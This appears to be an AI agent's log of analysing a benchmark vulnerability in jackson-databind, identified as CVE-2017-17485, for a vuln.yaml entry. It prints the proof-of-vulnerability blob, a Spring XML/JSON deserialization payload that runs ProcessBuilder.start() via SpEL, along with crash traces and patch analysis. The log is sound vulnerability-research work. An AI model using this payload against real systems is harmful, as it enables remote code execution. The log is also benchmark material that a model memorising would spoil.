@@ -1,0 +1,1148 @@
+# vuln.yaml Generation Agent Log
+Generated: 2026-01-14T06:08:54.027019
+Benchmark: atlanta-jackson-databind-delta-01
+Harness: JacksonDatabindOneFDP
+CPV: cpv_0
+Project Directory: .crsbench-repos/cp-java-jackson-databind-source-d9087613
+
+
+Validation: PASSED
+
+
+======================================================================
+Phase: Vulnerability Analysis
+======================================================================
+
+
+[Agent Response]
+I'll analyze the vulnerability for cpv_0 in harness JacksonDatabindOneFDP using the vuln-yaml-analyzer skill.
+
+[Tool] Skill
+  Input: {
+  "skill": "vuln-yaml-analyzer"
+}
+  Result: Launching skill: vuln-yaml-analyzer
+
+[Agent Response]
+<command-message>The "vuln-yaml-analyzer" skill is running</command-message>
+<command-name>vuln-yaml-analyzer</command-name>
+
+
+[Agent Response]
+Base directory for this skill: /home/acorn421/work/team-atlanta/CRSBench/.claude/skills/vuln-yaml-analyzer
+
+# Vulnerability Analyzer
+
+Analyze a vulnerability from crash logs, POV files, patches, and source code to prepare for vuln.yaml generation.
+
+## Analysis Strategy
+
+### Step 1: Analyze Crash Log (CRITICAL - Start Here)
+
+The crash log is the primary source of vulnerability information.
+
+**CRITICAL**:
+- **ONLY** read crash log files from the CPV's logs directory
+- **DO NOT** search for crash logs from other CPVs
+
+Find and read crash log files (e.g., `pov_0.log`, `crash.log`).
+
+Extract key information:
+- **Error type**: AddressSanitizer error (heap-buffer-overflow, use-after-free, etc.)
+- **Vulnerable function**: The function where the crash occurred (from stack trace)
+- **Vulnerable file**: The source file path (from stack trace)
+- **Line number**: Exact line where crash happened
+- **DEDUP_TOKEN**: Unique identifier for this crash
+- **Stack trace**: Full call stack for understanding control flow
+
+Example crash log parsing:
+```
+ERROR: AddressSanitizer: heap-buffer-overflow
+READ of size 45 at 0x50400000033c
+#0 __asan_memcpy /src/llvm-project/compiler-rt/lib/asan/...
+#1 cr_buf_read /src/curl/lib/sendf.c:1298:5    <-- Vulnerable function
+#2 Curl_creader_read /src/curl/lib/sendf.c:542:10
+...
+SUMMARY: AddressSanitizer: heap-buffer-overflow /src/curl/lib/sendf.c:1298:5 in cr_buf_read
+```
+
+From this, extract:
+- Error type: heap-buffer-overflow
+- File: lib/sendf.c (relative to project root)
+- Function: cr_buf_read
+- Line: 1298
+
+### Step 2: Identify Location Types
+
+For each vulnerability location, determine its type:
+
+**crash_site**: The point where the program crashes or error is detected
+- This is typically the location from the crash log stack trace
+- MUST be in project code
+- Example: The function where buffer overflow READ occurs
+
+**root_cause**: The underlying defect that enables the vulnerability
+- This is where the actual bug/defect exists
+- May be different from crash site (e.g., missing bounds check, incorrect allocation)
+- Example: Where buffer is allocated too small, or where bounds check is missing
+- **IMPORTANT: Analyze patches to identify root_cause** - patches show exactly what was fixed
+
+**EXCLUDE from both crash_site and root_cause:**
+- Harness files (fuzzing harness code, e.g., `*_fuzzer.c`, `*_fuzzer.cc`, `LLVMFuzzerTestOneInput`)
+- ASan/sanitizer functions (`__asan_*`, `__msan_*`, `__ubsan_*`)
+- Standard library functions (`memcpy`, `malloc`, `free`, `strlen`, etc.)
+- Compiler runtime functions (`__interceptor_*`, `llvm-project/compiler-rt/*`)
+- Only include actual project source code locations
+
+### Step 3: Locate Vulnerable Code
+
+- Use the file path from crash log to find the vulnerable source file
+- Read the vulnerable file around the crash line number
+- Identify the exact vulnerability location
+- Note the function name, line numbers, and code context
+
+### Step 4: Analyze POV (if available)
+
+- Check the CPV's blobs/ directory for POV files
+- These are test inputs that trigger the vulnerability
+- Note if POV structure provides hints about vulnerability type
+
+### Step 5: Analyze Patches (CRITICAL for root_cause)
+
+- Check the CPV's patches/ directory for patch files
+- **Patches are the primary source for identifying root_cause location**
+- Analyze what was changed to fix the vulnerability:
+  - Which file(s) were modified?
+  - Which function(s) were changed?
+  - What line(s) were added/removed?
+- The patch location typically indicates the root_cause location
+- If patch differs from crash site, you likely have separate crash_site and root_cause
+
+### Step 6: Identify Vulnerability Origin and Reference
+
+**⚠️ CRITICAL: DO NOT GUESS. ONLY USE CONCRETE EVIDENCE. ⚠️**
+
+**origin**: Source of the vulnerability
+- `1-day`: Real-world vulnerability with confirmed official reference (CVE, OSV, GHSA, bug tracker, etc.)
+- `synthetic`: Everything else (DEFAULT)
+
+**🚨 RULES FOR 1-day CLASSIFICATION 🚨**
+
+1. **Start with patch files** - Extract key information:
+   - Function name(s) being patched
+   - File path(s) being modified
+   - Type of fix (bounds check, null check, etc.)
+   - Any vulnerability ID already mentioned in patch (CVE, OSV, GHSA, issue #)
+
+2. **Search based on patch content:**
+   - Use WebSearch with: project name + function name + vulnerability keywords
+   - Example: `libtiff TIFFReadRawStrip1 CVE` or `libtiff TIFFReadRawStrip1 vulnerability`
+   - Look for an EXACT match - same function, same fix
+
+3. **Confirm the match:**
+   - The reference must describe the EXACT same vulnerability
+   - Same function name
+   - Same type of bug
+   - Same file/location
+   - If it's just "similar" but not exact → `synthetic`
+
+4. **DO NOT mark as `1-day` based on:**
+   - ❌ "Similar looking" vulnerabilities
+   - ❌ Same project but different function
+   - ❌ Same bug type but different location
+   - ❌ Guessing or "it might be"
+
+5. **If no EXACT match found → `synthetic`**
+
+**How to check (in order):**
+1. Read patch files - note function names, file paths, fix type
+2. Check if vulnerability ID already in patch content/filename (CVE, OSV, issue #)
+3. Check `.aixcc/meta.yaml` for existing reference
+4. WebSearch: `[project] [function_name] vulnerability` or `CVE` (only if needed)
+5. WebFetch: Get release_date from the reference source
+6. If no exact match → `synthetic`
+
+**release_date**:
+- For 1-day: Fetch from the official reference source (NVD, OSV, GitHub advisory, etc.)
+- For synthetic: Use `02/01/2026`
+
+**references**: List of URLs to vulnerability details (REQUIRED for 1-day)
+- Include all confirmed references (a single vulnerability may have multiple)
+- Valid reference sources:
+  - CVE: `https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXXX`
+  - OSV: `https://osv.dev/vulnerability/OSV-XXXX-XXXX`
+  - GHSA: `https://github.com/advisories/GHSA-xxxx-xxxx-xxxx`
+  - Project bug tracker: `https://github.com/project/issues/XXX`
+  - Other official security advisories
+- Example: A vulnerability may have both CVE and GHSA references
+
+### Step 7: Identify CWE
+
+Based on the vulnerability type, identify relevant CWEs:
+- Heap buffer overflow -> CWE-122, CWE-787
+- Stack buffer overflow -> CWE-121, CWE-787
+- Use-after-free -> CWE-416
+- NULL pointer dereference -> CWE-476
+- Integer overflow -> CWE-190
+- Command injection -> CWE-77
+- Path traversal -> CWE-22
+- Format string -> CWE-134
+
+## Output Format
+
+Provide a markdown document with this structure:
+
+```markdown
+# Vulnerability Analysis for {cpv_id}
+
+## Summary
+- **CPV ID**: {cpv_id}
+- **Harness**: {harness_name}
+- **Vulnerability Type**: <type from crash log>
+- **Origin**: <1-day or synthetic>
+- **Release Date**: <MM/DD/YYYY>
+- **References**: <list of CVE/OSV/GHSA URLs if available>
+
+## Crash Log Analysis
+- **Error Type**: <AddressSanitizer error type>
+- **Crash Location**: <file>:<line>
+- **Vulnerable Function**: <function name>
+- **DEDUP Token**: <dedup token from crash log>
+
+### Stack Trace
+<relevant stack trace snippet>
+
+## Vulnerable Code Location(s)
+
+### Location 1 (crash_site)
+- **Type**: crash_site
+- **File Path**: <path from project root>
+- **Function**: <function name>
+- **Line Range**: <start>-<end>
+- **Column Range**: <start>-<end>
+
+### Location 2 (root_cause) - if different from crash_site
+- **Type**: root_cause
+- **File Path**: <path from project root>
+- **Function**: <function name>
+- **Line Range**: <start>-<end>
+- **Column Range**: <start>-<end>
+
+### Code Context
+<vulnerable code snippet>
+
+## CWE Classification
+- CWE-XXX: <description>
+- CWE-YYY: <description>
+
+## Vulnerability Description
+<Clear description of the vulnerability, its cause, and impact>
+
+## POV Analysis (if available)
+<Analysis of proof-of-vulnerability test case>
+
+## Patch Analysis (if available)
+<Analysis of how the vulnerability was fixed>
+
+## Recommendations
+- Suggested CWEs: [CWE-XXX, CWE-YYY]
+- Vulnerability name: <concise name>
+```
+
+## Important Notes
+
+- **ALWAYS read and analyze the crash log first** - it contains the most critical information
+- **ONLY analyze crash logs from the specified CPV's logs directory**
+- Use Grep and Glob to find relevant source code files (NOT other CPVs' crash logs)
+- Read actual source code to verify vulnerability locations
+- Cite specific file paths and line numbers
+- Be precise about code locations (line and column numbers)
+- Distinguish between crash_site and root_cause locations
+
+
+
+[Agent Response]
+I'll analyze the vulnerability for cpv_0 in harness JacksonDatabindOneFDP. Let me start by examining the crash log from the specified CPV directory.
+
+[Tool] Bash
+  Input: {
+  "command": "ls -la benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/",
+  "description": "List crash log files"
+}
+  Result: total 120
+drwxrwxr-x 2 acorn421 acorn421   4096 Dec 22 17:50 .
+drwxrwxr-x 6 acorn421 acorn421   4096 Jan 13 23:50 ..
+-rw-rw-r-- 1 acorn421 acorn421 114523 Dec 22 17:50 pov_0.log
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log"
+}
+  Result: File content (38079 tokens) exceeds maximum allowed tokens (25000). Please use offset and limit parameters to read specific portions of the file, or use the GrepTool to search for specific content.
+[Tool] Bash
+  Input: {
+  "command": "head -n 200 benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log",
+  "description": "Read first 200 lines of crash log"
+}
+  Result: + FUZZER=JacksonDatabindOneFDP
++ shift
++ '[' '!' -v TESTCASE ']'
++ TESTCASE=/testcase
++ '[' '!' -f /testcase ']'
++ export RUN_FUZZER_MODE=interactive
++ RUN_FUZZER_MODE=interactive
++ export FUZZING_ENGINE=libfuzzer
++ FUZZING_ENGINE=libfuzzer
++ export SKIP_SEED_CORPUS=1
++ SKIP_SEED_CORPUS=1
++ run_fuzzer JacksonDatabindOneFDP -runs=100 /testcase
+vm.mmap_rnd_bits = 28
+/out/JacksonDatabindOneFDP -rss_limit_mb=2560 -timeout=25 -runs=100 /testcase < /dev/null
+OpenJDK 64-Bit Server VM warn... (truncated)
+
+[Agent Response]
+Let me search for the actual error in the crash log:
+
+[Tool] Bash
+  Input: {
+  "command": "grep -n \"ERROR:\\|Exception\\|SUMMARY:\" benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log | head -50",
+  "description": "Find error messages in crash log"
+}
+  Result: 92:INFO: Instrumented com.fasterxml.jackson.core.JsonProcessingException (took 2 ms, size +11%)
+96:INFO: Instrumented com.fasterxml.jackson.databind.JsonMappingException (took 6 ms, size +9%)
+98:INFO: Instrumented com.fasterxml.jackson.databind.exc.MismatchedInputException (took 1 ms, size +5%)
+244:INFO: Instrumented com.fasterxml.jackson.databind.exc.InvalidTypeIdException (took 0 ms, size +8%)
+245:INFO: Instrumented com.fasterxml.jackson.databind.exc.InvalidDefinitionException (took 2 ms, ... (truncated)
+
+[Agent Response]
+Let me search for the actual vulnerability/error (stack trace or assertion failure):
+
+[Tool] Bash
+  Input: {
+  "command": "grep -n \"at com.fasterxml\\|at org.springframework\\|Caused by:\\|DEDUP_TOKEN\\|Stack trace:\" benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log | tail -100",
+  "description": "Find stack trace in crash log"
+}
+  Result: 1104:	at org.springframework.expression.spel.support.ReflectiveMethodExecutor.execute(ReflectiveMethodExecutor.java:120)
+1105:	at org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:134)
+1106:	at org.springframework.expression.spel.ast.MethodReference.access$000(MethodReference.java:53)
+1107:	at org.springframework.expression.spel.ast.MethodReference$MethodValueRef.getValue(MethodReference.java:360)
+1108:	at org.springframework.expression.spel.ast.Co... (truncated)
+
+[Agent Response]
+Great! Now let me get the full context around the exception:
+
+[Tool] Bash
+  Input: {
+  "command": "tail -200 benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log | head -100",
+  "description": "Get end of crash log with exception"
+}
+  Result: INFO: Instrumented org.springframework.beans.propertyeditors.CustomBooleanEditor (took 1 ms, size +78%)
+INFO: Instrumented org.springframework.beans.propertyeditors.CustomNumberEditor (took 1 ms, size +17%)
+INFO: Instrumented org.springframework.beans.propertyeditors.StringArrayPropertyEditor (took 1 ms, size +17%)
+INFO: Instrumented org.springframework.core.CollectionFactory (took 3 ms, size +25%)
+INFO: Instrumented org.springframework.core.CollectionFactory$1 (took 0 ms, size +14%)
+INFO: ... (truncated)
+[Tool] Bash
+  Input: {
+  "command": "tail -50 benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log",
+  "description": "Get final lines of crash log"
+}
+  Result: 	at org.springframework.expression.spel.ast.SpelNodeImpl.getValue(SpelNodeImpl.java:110)
+	at org.springframework.expression.spel.standard.SpelExpression.getValue(SpelExpression.java:270)
+	at org.springframework.context.expression.StandardBeanExpressionResolver.evaluate(StandardBeanExpressionResolver.java:163)
+	at org.springframework.beans.factory.support.AbstractBeanFactory.evaluateBeanDefinitionString(AbstractBeanFactory.java:1452)
+	at org.springframework.beans.factory.support.BeanDefinitio... (truncated)
+
+[Agent Response]
+Now let me look for the exact exception type and more context:
+
+[Tool] Bash
+  Input: {
+  "command": "grep -B 20 \"DEDUP_TOKEN\" benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log | head -30",
+  "description": "Get exception details before DEDUP_TOKEN"
+}
+  Result: 	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:77)
+	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+	at java.base/java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:499)
+	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:48... (truncated)
+
+[Agent Response]
+Let me search for the actual exception message:
+
+[Tool] Bash
+  Input: {
+  "command": "grep -E \"^(com\\.fasterxml|org\\.springframework|java\\.|Caused by:|Exception in thread)\" benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log | head -10",
+  "description": "Find exception start"
+}
+  Result: 
+[Tool] Bash
+  Input: {
+  "command": "grep -n \"^org.springframework\\|^com.fasterxml\\|^java.io.IOException\" benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log | head -5",
+  "description": "Find exception type"
+}
+  Result: 
+
+[Agent Response]
+Let me try a different approach to find the exception:
+
+[Tool] Bash
+  Input: {
+  "command": "awk '/^[a-zA-Z].*Exception:/{p=1} p{print; if(/DEDUP_TOKEN/)exit}' benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/logs/pov_0.log | head -80",
+  "description": "Extract exception and stack trace"
+}
+  Result: WARNING: Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'pb' defined in file [/tmp/databind/exploit.xml]: Initialization of bean failed; nested exception is org.springframework.beans.factory.BeanExpressionException: Expression parsing failed; nested exception is org.springframework.expression.ExpressionInvocationTargetException: A problem occurred when trying to execute metho... (truncated)
+
+[Agent Response]
+Perfect! Now I have the full exception. This is a **Remote Code Execution (RCE) vulnerability via OS Command Injection** detected by Jazzer. The vulnerability allows deserialization of arbitrary objects through Jackson's polymorphic type handling. Now let me check the patches:
+
+[Tool] Bash
+  Input: {
+  "command": "ls -la benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/patches/",
+  "description": "List patch files"
+}
+  Result: total 16
+drwxrwxr-x 2 acorn421 acorn421 4096 Dec 22 17:50 .
+drwxrwxr-x 6 acorn421 acorn421 4096 Jan 13 23:50 ..
+-rw-rw-r-- 1 acorn421 acorn421 7461 Dec 22 17:50 patch_0.diff
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/patches/patch_0.diff"
+}
+  Result:      1→From 863b033cc5eb49ddf0d64469aca9512eff553474 Mon Sep 17 00:00:00 2001
+     2→From: Tatu Saloranta <kj2648@naver.com>
+     3→Date: Tue, 12 Dec 2017 17:34:55 -0800
+     4→Subject: [PATCH] patch
+     5→
+     6→---
+     7→ release-notes/VERSION-2.x                     |  1 +
+     8→ .../deser/BeanDeserializerFactory.java        | 13 +++
+     9→ .../jsontype/impl/SubTypeValidator.java       | 99 +++++++++++++++++++
+    10→ 3 files changed, 113 insertions(+)
+    11→ create mode 100644 src/main... (truncated)
+
+[Agent Response]
+Excellent! Now let me check the POV to understand the attack:
+
+[Tool] Bash
+  Input: {
+  "command": "ls -la benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/blobs/",
+  "description": "List POV files"
+}
+  Result: total 12
+drwxrwxr-x 2 acorn421 acorn421 4096 Dec 22 17:50 .
+drwxrwxr-x 6 acorn421 acorn421 4096 Jan 13 23:50 ..
+-rw-rw-r-- 1 acorn421 acorn421  574 Dec 22 17:50 pov_0.blob
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/benchmarks/atlanta-jackson-databind-delta-01/.aixcc/JacksonDatabindOneFDP/cpv_0/blobs/pov_0.blob"
+}
+  Result:      1→/tmp/databind/exploit.xml<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"><bean id="pb" class="java.lang.ProcessBuilder"><constructor-arg value="jazze" /><property name="whatever" value="#{ pb.start() }"/></bean></beans>{"id":123, "obj": ["org.springframework.context.support.FileSystemXmlApplicationCon... (truncated)
+
+[Agent Response]
+Perfect! Now let me check the meta.yaml to see if there's already information about this vulnerability:
+
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/benchmarks/atlanta-jackson-databind-delta-01/.aixcc/meta.yaml"
+}
+  Result:      1→patch_exclude_list:
+     2→- build.sh
+     3→- Makefile
+     4→- CMakeLists.txt
+     5→- configure*
+     6→- '*.ac'
+     7→- '*.am'
+     8→- .gitignore
+     9→- .aixcc/**
+    10→- '**/*test*.c'
+    11→- '**/*test*.cc'
+    12→- '**/*test*.cpp'
+    13→- '**/*test*.h'
+    14→- test/**
+    15→- tests/**
+    16→- docs/**
+    17→- '*.md'
+    18→- README*
+    19→delta_mode:
+    20→  base_commit: f8b096071efbc48625127bbb99516f3b4dac1545
+    21→  ref_commit: d90876130cd0f8de5f940ebc4a292bb2b2e8ea8... (truncated)
+
+[Agent Response]
+Now let me find the Jackson databind source code to locate the vulnerable files:
+
+[Tool] Bash
+  Input: {
+  "command": "ls -la .crsbench-repos/ | grep jackson",
+  "description": "Find jackson source directory"
+}
+  Result: drwxrwxr-x  8 acorn421 acorn421 4096 Jan 14 06:05 cp-java-jackson-databind-source-d9087613
+[Tool] Bash
+  Input: {
+  "command": "find .crsbench-repos/cp-java-jackson-databind-source-d9087613 -name \"BeanDeserializerFactory.java\" -type f",
+  "description": "Find BeanDeserializerFactory.java"
+}
+  Result: .crsbench-repos/cp-java-jackson-databind-source-d9087613/src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/.crsbench-repos/cp-java-jackson-databind-source-d9087613/src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java",
+  "limit": 50,
+  "offset": 125
+}
+  Result:    125→        if (deser != null) {
+   126→            return deser;
+   127→        }
+   128→
+   129→        // Otherwise: could the class be a Bean class? If not, bail out
+   130→        if (!isPotentialBeanType(type.getRawClass())) {
+   131→            return null;
+   132→        }
+   133→        // Use generic bean introspection to build deserializer
+   134→        return buildBeanDeserializer(ctxt, type, beanDesc);
+   135→    }
+   136→
+   137→    @Override
+   138→    public JsonDeserializer<... (truncated)
+
+[Agent Response]
+Now let me search for CVE information related to this vulnerability. Based on the patch, this is related to CVE-2017-17485 (issue #1855):
+
+[Tool] WebSearch
+  Input: {
+  "query": "CVE-2017-17485 jackson-databind FileSystemXmlApplicationContext deserialization"
+}
+  Result: Web search results for query: "CVE-2017-17485 jackson-databind FileSystemXmlApplicationContext deserialization"
+
+Links: [{"title":"GitHub - irsl/jackson-rce-via-spel: An example project that exploits the default typing issue in Jackson-databind via Spring application contexts and expressions","url":"https://github.com/irsl/jackson-rce-via-spel"},{"title":"CVE-2017-17485 : FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthe","url":"https://www.cvedetails.com/cve/CVE-2... (truncated)
+[Tool] WebFetch
+  Input: {
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-17485",
+  "prompt": "Extract the CVE publication date, description, affected versions, and fix versions for CVE-2017-17485"
+}
+  Result: # CVE-2017-17485 Analysis
+
+**Publication Date:** January 10, 2018
+
+**Description:**
+"FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw."
+
+The vulnerability enables attackers to exploit the ObjectMapper's readValue method by sending malicious JSON when Spring libraries are present in the classpath.
+
+**Affected Versions:**
+- jackson-databind versions up to 2.6.7.3
+- ... (truncated)
+[Tool] WebFetch
+  Input: {
+  "url": "https://github.com/advisories/GHSA-rfx6-vp9g-rh7v",
+  "prompt": "Extract the publication date and any additional details about GHSA-rfx6-vp9g-rh7v"
+}
+  Result: # CVE-2017-17485 Publication Details
+
+**Publication Date:** October 18, 2018 (to GitHub Advisory Database)
+
+**Additional Key Details:**
+
+- **Severity:** Critical (CVSS 9.8)
+- **Affected Package:** FasterXML jackson-databind
+- **Vulnerability Type:** Remote code execution via unsafe deserialization
+- **Description:** The vulnerability represents "an incomplete fix for the CVE-2017-7525 deserialization flaw," enabling attackers to bypass a blacklist when Spring libraries are present in the classpa... (truncated)
+
+[Agent Response]
+Perfect! Now let me look at the exact code locations. Let me check the crash site in the Jackson databind code:
+
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/.crsbench-repos/cp-java-jackson-databind-source-d9087613/src/main/java/com/fasterxml/jackson/databind/introspect/AnnotatedConstructor.java",
+  "limit": 20,
+  "offset": 120
+}
+  Result:    120→    }
+   121→
+   122→    @Override
+   123→    public final Object call(Object[] args) throws Exception {
+   124→        return _constructor.newInstance(args);
+   125→    }
+   126→
+   127→    @Override
+   128→    public final Object call1(Object arg) throws Exception {
+   129→        return _constructor.newInstance(arg);
+   130→    }
+   131→    
+   132→    /*
+   133→    /**********************************************************
+   134→    /* AnnotatedMember impl
+   135→    /**************... (truncated)
+
+[Agent Response]
+Now let me check the deser package for the crash location:
+
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/.crsbench-repos/cp-java-jackson-databind-source-d9087613/src/main/java/com/fasterxml/jackson/databind/deser/std/StdValueInstantiator.java",
+  "limit": 20,
+  "offset": 315
+}
+  Result:    315→    /* Public API implementation; instantiation from JSON scalars
+   316→    /**********************************************************
+   317→     */
+   318→
+   319→    @Override
+   320→    public Object createFromString(DeserializationContext ctxt, String value) throws IOException
+   321→    {
+   322→        if (_fromStringCreator == null) {
+   323→            return _createFromStringFallbacks(ctxt, value);
+   324→        }
+   325→        try {
+   326→            return _fromStringCrea... (truncated)
+
+[Agent Response]
+Now let me check the BeanDeserializerBase to see the deserializeFromString method:
+
+[Tool] Bash
+  Input: {
+  "command": "find .crsbench-repos/cp-java-jackson-databind-source-d9087613 -name \"BeanDeserializerBase.java\" -type f",
+  "description": "Find BeanDeserializerBase.java"
+}
+  Result: .crsbench-repos/cp-java-jackson-databind-source-d9087613/src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerBase.java
+[Tool] Bash
+  Input: {
+  "command": "grep -n \"deserializeFromString\" .crsbench-repos/cp-java-jackson-databind-source-d9087613/src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerBase.java",
+  "description": "Find deserializeFromString method"
+}
+  Result: 1333:    public Object deserializeFromString(JsonParser p, DeserializationContext ctxt)
+[Tool] Read
+  Input: {
+  "file_path": "/home/acorn421/work/team-atlanta/CRSBench/.crsbench-repos/cp-java-jackson-databind-source-d9087613/src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerBase.java",
+  "limit": 30,
+  "offset": 1333
+}
+  Result:   1333→    public Object deserializeFromString(JsonParser p, DeserializationContext ctxt)
+  1334→        throws IOException
+  1335→    {
+  1336→        // First things first: id Object Id is used, most likely that's it
+  1337→        if (_objectIdReader != null) {
+  1338→            return deserializeFromObjectId(p, ctxt);
+  1339→        }
+  1340→        // Bit complicated if we have delegating creator; may need to use it,
+  1341→        // or might not...
+  1342→        JsonDeserializer<Object>... (truncated)
+
+[Agent Response]
+Now let me create a comprehensive vulnerability analysis document:
+
+# Vulnerability Analysis for cpv_0
+
+## Summary
+- **CPV ID**: cpv_0
+- **Harness**: JacksonDatabindOneFDP
+- **Vulnerability Type**: Remote Code Execution (RCE) via Unsafe Deserialization / OS Command Injection
+- **Origin**: 1-day
+- **CVE**: CVE-2017-17485
+- **Release Date**: 01/10/2018
+- **References**: 
+  - https://nvd.nist.gov/vuln/detail/CVE-2017-17485
+  - https://github.com/advisories/GHSA-rfx6-vp9g-rh7v
+
+## Crash Log Analysis
+- **Error Type**: FuzzerSecurityIssueCritical: OS Command Injection
+- **Detection**: Jazzer security hook detected OS command execution with attacker-controlled data
+- **Vulnerable Function**: `createFromString` (StdValueInstantiator.java:326)
+- **DEDUP Token**: 76c5f40ff9de70c8
+
+### Stack Trace
+The vulnerability is triggered through Jackson's polymorphic deserialization:
+```
+== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection
+Executing OS commands with attacker-controlled data can lead to remote code execution.
+	at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.processImplStartHook(OsCommandInjection.kt:60)
+	at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)
+	[... Spring Expression Language (SpEL) execution ...]
+	at org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:134)
+	[... Spring context initialization ...]
+	at org.springframework.context.support.FileSystemXmlApplicationContext.<init>(FileSystemXmlApplicationContext.java:85)
+	at com.fasterxml.jackson.databind.introspect.AnnotatedConstructor.call1(AnnotatedConstructor.java:129)
+	at com.fasterxml.jackson.databind.deser.std.StdValueInstantiator.createFromString(StdValueInstantiator.java:326)
+	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.deserializeFromString(BeanDeserializerBase.java:1353)
+	at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeOther(BeanDeserializer.java:170)
+	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:161)
+	[... type deserializer chain ...]
+	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3079)
+```
+
+## Vulnerable Code Location(s)
+
+### Location 1 (root_cause - Missing Type Validation)
+- **Type**: root_cause
+- **File Path**: src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java
+- **Function**: `createBeanDeserializer`
+- **Line Range**: 130-134
+- **Column Range**: 1-50
+
+### Location 2 (crash_site - Deserialization Point)
+- **Type**: crash_site
+- **File Path**: src/main/java/com/fasterxml/jackson/databind/deser/std/StdValueInstantiator.java
+- **Function**: `createFromString`
+- **Line Range**: 320-331
+- **Column Range**: 1-80
+
+### Code Context
+
+**Root Cause Location (BeanDeserializerFactory.java:130-134):**
+```java
+// Before patch - missing validation
+if (!isPotentialBeanType(type.getRawClass())) {
+    return null;
+}
+// Use generic bean introspection to build deserializer
+return buildBeanDeserializer(ctxt, type, beanDesc);
+```
+
+**After Patch (lines 130-135):**
+```java
+if (!isPotentialBeanType(type.getRawClass())) {
+    return null;
+}
+// For checks like [databind#1599]
+_validateSubType(ctxt, type, beanDesc);  // <-- NEW VALIDATION
+// Use generic bean introspection to build deserializer
+return buildBeanDeserializer(ctxt, type, beanDesc);
+```
+
+**Crash Site Location (StdValueInstantiator.java:326):**
+```java
+public Object createFromString(DeserializationContext ctxt, String value) throws IOException
+{
+    if (_fromStringCreator == null) {
+        return _createFromStringFallbacks(ctxt, value);
+    }
+    try {
+        return _fromStringCreator.call1(value);  // Line 326 - triggers malicious constructor
+    } catch (Throwable t) {
+        return ctxt.handleInstantiationProblem(_fromStringCreator.getDeclaringClass(),
+                value, rewrapCtorProblem(ctxt, t));
+    }
+}
+```
+
+## CWE Classification
+- **CWE-502**: Deserialization of Untrusted Data (primary)
+- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') (consequence)
+- **CWE-184**: Incomplete List of Disallowed Inputs (mechanism)
+
+## Vulnerability Description
+
+This is a **Remote Code Execution (RCE) vulnerability** in FasterXML jackson-databind caused by unsafe polymorphic deserialization. The vulnerability allows attackers to execute arbitrary code by sending malicious JSON that instructs Jackson to deserialize dangerous classes.
+
+### Attack Mechanism
+
+1. **Polymorphic Type Handling**: Jackson's default typing feature allows JSON to specify which Java class should be instantiated during deserialization using type information embedded in the JSON.
+
